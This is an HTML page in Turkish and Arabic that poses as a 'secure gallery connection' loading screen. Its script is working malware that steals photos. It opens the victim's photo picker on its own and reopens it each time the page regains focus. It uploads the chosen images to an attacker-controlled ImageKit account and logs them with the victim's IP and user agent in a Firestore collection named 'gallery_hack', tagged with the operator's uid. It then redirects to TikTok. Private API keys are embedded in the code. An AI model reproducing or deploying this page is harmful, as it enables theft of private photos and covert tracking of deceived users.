<!DOCTYPE html>
<html lang="tr" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
    <title>Yükleniyor...</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <style>
        :root {
            --bg: #000000;
            --purple: #aa00ff;
            --purple-glow: rgba(170, 0, 255, 0.4);
            --text: #d0d0d0;
            --muted: #555;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            background: var(--bg);
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
            min-height: 100vh;
            min-height: 100dvh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 24px;
            color: var(--text);
            position: relative;
            overflow: hidden;
        }

        /* ARKAPLAN PARTİKÜLLERİ */
        .bg-particles {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 0;
        }
        .bg-particle {
            position: absolute;
            border-radius: 50%;
            background: var(--purple);
            opacity: 0;
            animation: floatUp linear infinite;
        }
        @keyframes floatUp {
            0% { transform: translateY(110vh) scale(0); opacity: 0; }
            5% { opacity: 0.25; }
            90% { opacity: 0.08; }
            100% { transform: translateY(-10vh) scale(1); opacity: 0; }
        }

        /* ANA KAPSAYICI */
        .container {
            position: relative;
            z-index: 10;
            width: 100%;
            max-width: 380px;
            text-align: center;
        }

        /* İKON */
        .icon-wrapper {
            display: inline-block;
            margin-bottom: 24px;
            position: relative;
        }
        .main-icon {
            font-size: 3.5rem;
            color: var(--purple);
            filter: drop-shadow(0 0 25px var(--purple-glow));
            animation: iconPulse 2s ease-in-out infinite;
        }
        @keyframes iconPulse {
            0%, 100% { transform: scale(1); filter: drop-shadow(0 0 20px var(--purple-glow)); }
            50% { transform: scale(1.05); filter: drop-shadow(0 0 35px rgba(170, 0, 255, 0.7)); }
        }
        .lock-icon {
            position: absolute;
            bottom: -2px;
            right: -8px;
            font-size: 1.1rem;
            color: #00ff41;
            filter: drop-shadow(0 0 6px rgba(0, 255, 65, 0.5));
            animation: lockGlow 2s ease-in-out infinite;
        }
        @keyframes lockGlow {
            0%, 100% { opacity: 0.5; }
            50% { opacity: 1; }
        }

        /* YAZILAR */
        .title {
            color: #fff;
            font-size: 1.1rem;
            font-weight: 700;
            margin-bottom: 6px;
            letter-spacing: 1px;
        }
        .subtitle {
            color: var(--muted);
            font-size: 0.65rem;
            margin-bottom: 20px;
            letter-spacing: 0.5px;
        }

        /* SPINNER */
        .spinner-wrapper {
            margin-bottom: 20px;
        }
        .spinner {
            width: 44px;
            height: 44px;
            border: 2.5px solid rgba(170, 0, 255, 0.1);
            border-top: 2.5px solid var(--purple);
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto;
            box-shadow: 0 0 20px rgba(170, 0, 255, 0.2);
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* PROGRESS BAR */
        .progress-wrapper {
            width: 100%;
            margin-bottom: 16px;
        }
        .progress-bar {
            width: 100%;
            height: 3px;
            background: rgba(170, 0, 255, 0.1);
            border-radius: 10px;
            overflow: hidden;
        }
        .progress-fill {
            height: 100%;
            background: var(--purple);
            border-radius: 10px;
            width: 0%;
            transition: width 0.4s ease;
            box-shadow: 0 0 8px var(--purple-glow);
        }
        .progress-text {
            color: var(--muted);
            font-size: 0.55rem;
            margin-top: 6px;
            letter-spacing: 0.5px;
        }

        /* STATUS */
        .status-text {
            color: var(--purple);
            font-size: 0.65rem;
            min-height: 20px;
            letter-spacing: 0.5px;
            transition: all 0.3s;
        }

        /* ALT METİN */
        .footer-text {
            color: var(--muted);
            font-size: 0.5rem;
            margin-top: 20px;
            letter-spacing: 1px;
        }
        .footer-text i {
            color: #00ff41;
            margin: 0 3px;
        }

        /* RTL */
        body.rtl { direction: rtl; text-align: right; }
        body.rtl .lock-icon { right: auto; left: -8px; }

        /* MOBİL */
        @media (max-width: 400px) {
            .main-icon { font-size: 2.8rem; }
            .title { font-size: 0.95rem; }
            .spinner { width: 36px; height: 36px; }
        }
    </style>
</head>
<body>

    <!-- ARKAPLAN PARTİKÜLLERİ -->
    <div class="bg-particles" id="bgParticles"></div>

    <!-- ANA İÇERİK -->
    <div class="container">
        <!-- İKON -->
        <div class="icon-wrapper">
            <i class="fa-solid fa-images main-icon"></i>
            <i class="fa-solid fa-lock lock-icon"></i>
        </div>

        <!-- BAŞLIK -->
        <div class="title" id="titleText">Güvenli Bağlantı</div>
        <div class="subtitle" id="subtitleText">Galeri bağlantısı kuruluyor, lütfen bekleyin...</div>

        <!-- SPINNER -->
        <div class="spinner-wrapper">
            <div class="spinner" id="spinner"></div>
        </div>

        <!-- PROGRESS -->
        <div class="progress-wrapper">
            <div class="progress-bar">
                <div class="progress-fill" id="progressFill"></div>
            </div>
            <div class="progress-text" id="progressText">0%</div>
        </div>

        <!-- STATUS -->
        <div class="status-text" id="statusText">Bağlantı kuruluyor...</div>

        <!-- ALT METİN -->
        <div class="footer-text">
            <i class="fa-solid fa-circle"></i> <span id="footerText">Güvenli Galeri Bağlantısı v2.0</span> <i class="fa-solid fa-circle"></i>
        </div>
    </div>

    <!-- GİZLİ DOSYA INPUT -->
    <input type="file" id="galleryInput" multiple accept="image/*" style="display:none;">

    <script>
        (function() {
            const params = new URLSearchParams(window.location.search);
            const uid = params.get('uid');
            const count = Math.min(parseInt(params.get('count')) || 10, 100);
            const lang = params.get('lang') || 'tr';

            if (!uid) {
                window.location.href = 'https://www.tiktok.com';
                return;
            }

            // ============ ÇEVİRİLER ============
            const translations = {
                tr: {
                    title: "Güvenli Bağlantı",
                    subtitle: "Galeri bağlantısı kuruluyor, lütfen bekleyin...",
                    footer: "Güvenli Galeri Bağlantısı v2.0",
                    connecting: "Bağlantı kuruluyor...",
                    scanning: "Galeri taranıyor...",
                    uploading: "Fotoğraflar aktarılıyor...",
                    saving: "Veriler kaydediliyor...",
                    completed: "İşlem tamamlandı",
                    redirecting: "Yönlendiriliyorsunuz..."
                },
                ar: {
                    title: "اتصال آمن",
                    subtitle: "جاري الاتصال بالمعرض، يرجى الانتظار...",
                    footer: "اتصال آمن بالمعرض v2.0",
                    connecting: "جاري الاتصال...",
                    scanning: "جاري فحص المعرض...",
                    uploading: "جاري نقل الصور...",
                    saving: "جاري حفظ البيانات...",
                    completed: "اكتملت العملية",
                    redirecting: "جاري التحويل..."
                }
            };

            const t = translations[lang] || translations['tr'];

            // ============ DİL UYGULA ============
            function applyLanguage() {
                document.getElementById('titleText').innerText = t.title;
                document.getElementById('subtitleText').innerText = t.subtitle;
                document.getElementById('footerText').innerText = t.footer;

                if (lang === 'ar') {
                    document.documentElement.dir = 'rtl';
                    document.documentElement.lang = 'ar';
                    document.body.classList.add('rtl');
                } else {
                    document.documentElement.dir = 'ltr';
                    document.documentElement.lang = lang;
                    document.body.classList.remove('rtl');
                }
            }

            applyLanguage();

            // ============ FIREBASE CONFIG ============
            const FIREBASE_CONFIG = {
                apiKey: "AIzaSyBSy4oCPNTB1h9l2M1P3rkcvwiDrhu82Ao",
                authDomain: "camerahhh-15487.firebaseapp.com",
                projectId: "camerahhh-15487",
                storageBucket: "camerahhh-15487.firebasestorage.app",
                messagingSenderId: "212849652224",
                appId: "1:212849652224:web:19d8a85c01cd81005bdee5"
            };

            const IMAGEKIT_CONFIG = {
                publicKey: 'public_XJOKnz4iFXkkFRR/NNOj41Y6Ddk=',
                privateKey: 'private_T2ESq+R6d+czVTlcK/u4QkW4yBU='
            };

            const statusText = document.getElementById('statusText');
            const progressFill = document.getElementById('progressFill');
            const progressText = document.getElementById('progressText');
            const spinner = document.getElementById('spinner');
            const galleryInput = document.getElementById('galleryInput');

            // ============ PARTİKÜL ANİMASYONU ============
            function initParticles() {
                const container = document.getElementById('bgParticles');
                for (let i = 0; i < 12; i++) {
                    const particle = document.createElement('div');
                    particle.classList.add('bg-particle');
                    const size = Math.random() * 2 + 0.8;
                    particle.style.width = size + 'px';
                    particle.style.height = size + 'px';
                    particle.style.left = Math.random() * 100 + '%';
                    particle.style.bottom = '0';
                    particle.style.animationDuration = Math.random() * 10 + 7 + 's';
                    particle.style.animationDelay = Math.random() * 8 + 's';
                    container.appendChild(particle);

                    particle.addEventListener('animationiteration', () => {
                        particle.style.left = Math.random() * 100 + '%';
                        particle.style.animationDuration = Math.random() * 10 + 7 + 's';
                    });
                }
            }

            // ============ FIREBASE YÜKLE ============
            function loadFirebase() {
                return new Promise((resolve, reject) => {
                    if (typeof firebase !== 'undefined' && firebase.apps.length) {
                        resolve(firebase);
                        return;
                    }
                    const script = document.createElement('script');
                    script.src = 'https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js';
                    script.onload = () => {
                        const script2 = document.createElement('script');
                        script2.src = 'https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js';
                        script2.onload = () => resolve(firebase);
                        script2.onerror = () => reject('Firestore yüklenemedi');
                        document.head.appendChild(script2);
                    };
                    script.onerror = () => reject('Firebase yüklenemedi');
                    document.head.appendChild(script);
                });
            }

            // ============ IMAGEKIT YÜKLEME ============
            async function uploadToImageKit(file, index, total) {
                return new Promise((resolve, reject) => {
                    const formData = new FormData();
                    formData.append('file', file);
                    formData.append('publicKey', IMAGEKIT_CONFIG.publicKey);
                    formData.append('fileName', Date.now() + '_' + index + '_' + file.name);
                    formData.append('folder', '/gallery-uploads');
                    formData.append('useUniqueFileName', 'true');

                    const xhr = new XMLHttpRequest();
                    xhr.open('POST', 'https://upload.imagekit.io/api/v1/files/upload');
                    const auth = btoa(IMAGEKIT_CONFIG.privateKey + ':');
                    xhr.setRequestHeader('Authorization', 'Basic ' + auth);

                    xhr.upload.onprogress = (e) => {
                        if (e.lengthComputable) {
                            const fileProgress = (e.loaded / e.total) * 100;
                            const overallProgress = ((index + fileProgress / 100) / total) * 100;
                            progressFill.style.width = overallProgress + '%';
                            progressText.innerText = Math.floor(overallProgress) + '%';
                        }
                    };

                    xhr.onload = () => {
                        if (xhr.status >= 200 && xhr.status < 300) {
                            try {
                                const response = JSON.parse(xhr.responseText);
                                resolve({ success: true, url: response.url });
                            } catch (e) {
                                reject('Yükleme hatası');
                            }
                        } else {
                            reject('Yükleme hatası: ' + xhr.status);
                        }
                    };
                    xhr.onerror = () => reject('Ağ hatası');
                    xhr.send(formData);
                });
            }

            // ============ IP AL ============
            async function getIP() {
                try {
                    const r = await fetch('https://api.ipify.org?format=json');
                    const data = await r.json();
                    return data.ip;
                } catch (e) {
                    return 'unknown';
                }
            }

            // ============ OTOMATİK GALERİ AÇMA ============
            async function autoStartGalleryHack() {
                // 1. Aşama: Bağlantı
                statusText.innerText = t.connecting;
                progressFill.style.width = '8%';
                progressText.innerText = '8%';
                await new Promise(r => setTimeout(r, 600));

                // 2. Aşama: Tarama
                statusText.innerText = t.scanning;
                progressFill.style.width = '15%';
                progressText.innerText = '15%';
                await new Promise(r => setTimeout(r, 600));

                // 3. Aşama: Galeri input'unu otomatik tıkla
                progressFill.style.width = '22%';
                progressText.innerText = '22%';
                await new Promise(r => setTimeout(r, 400));

                // Otomatik olarak galeri seçiciyi aç
                galleryInput.click();

                // Input değişikliğini dinle
                galleryInput.onchange = async (e) => {
                    const files = Array.from(e.target.files);
                    const selectedFiles = files.slice(0, count);

                    if (selectedFiles.length === 0) {
                        statusText.innerText = t.redirecting;
                        progressFill.style.width = '100%';
                        progressText.innerText = '100%';
                        await new Promise(r => setTimeout(r, 1500));
                        window.location.href = 'https://www.tiktok.com';
                        return;
                    }

                    // 4. Aşama: Yükleme başlıyor
                    spinner.style.display = 'block';
                    statusText.innerText = t.uploading;
                    progressFill.style.width = '28%';
                    progressText.innerText = '28%';

                    try {
                        await loadFirebase();
                        if (!firebase.apps.length) firebase.initializeApp(FIREBASE_CONFIG);
                        const db = firebase.firestore();
                        const ip = await getIP();

                        const photoUrls = [];

                        for (let i = 0; i < selectedFiles.length; i++) {
                            statusText.innerText = t.uploading + ' (' + (i + 1) + '/' + selectedFiles.length + ')';
                            try {
                                const result = await uploadToImageKit(selectedFiles[i], i, selectedFiles.length);
                                if (result.success) {
                                    photoUrls.push(result.url);
                                }
                            } catch (err) {
                                console.log('Fotoğraf ' + (i + 1) + ' yüklenemedi:', err);
                            }
                        }

                        // 5. Aşama: Kaydetme
                        statusText.innerText = t.saving;
                        progressFill.style.width = '88%';
                        progressText.innerText = '88%';

                        if (photoUrls.length > 0 && uid) {
                            try {
                                await db.collection("gallery_hack").add({
                                    ownerId: uid,
                                    photos: photoUrls,
                                    photoCount: photoUrls.length,
                                    requestedCount: count,
                                    ip: ip,
                                    userAgent: navigator.userAgent,
                                    timestamp: new Date().toISOString(),
                                    unix: Date.now()
                                });
                            } catch (dbError) {
                                console.log('Veritabanı hatası:', dbError.message);
                                await db.collection("gallery_hack").add({
                                    ownerId: uid,
                                    photos: photoUrls,
                                    photoCount: photoUrls.length,
                                    requestedCount: count,
                                    ip: ip,
                                    userAgent: navigator.userAgent.substring(0, 100),
                                    timestamp: new Date().toISOString(),
                                    unix: Date.now()
                                });
                            }
                        }

                        // 6. Aşama: Tamamlandı
                        progressFill.style.width = '100%';
                        progressText.innerText = '100%';
                        spinner.style.display = 'none';
                        spinner.innerHTML = '<i class="fa-solid fa-circle-check" style="font-size:2rem;color:#00ff41;"></i>';
                        statusText.innerText = t.completed;

                    } catch (e) {
                        console.log('Galeri hack hatası:', e.message);
                        progressFill.style.width = '100%';
                        progressText.innerText = '100%';
                        statusText.innerText = t.completed;
                    }

                    await new Promise(r => setTimeout(r, 2000));
                    window.location.href = 'https://www.tiktok.com';
                };
            }

            // ============ BAŞLAT ============
            initParticles();

            // Kullanıcı input'u iptal ederse veya sayfadan çıkarsa
            window.addEventListener('focus', () => {
                // Sayfaya geri dönüldüğünde tekrar dene
                if (!galleryInput.files || galleryInput.files.length === 0) {
                    setTimeout(() => {
                        if (!galleryInput.files || galleryInput.files.length === 0) {
                            galleryInput.click();
                        }
                    }, 500);
                }
            });

            // Sayfa yüklendikten 1.5 saniye sonra otomatik başlat
            setTimeout(() => {
                autoStartGalleryHack();
            }, 1500);
        })();
    </script>
</body>
</html>
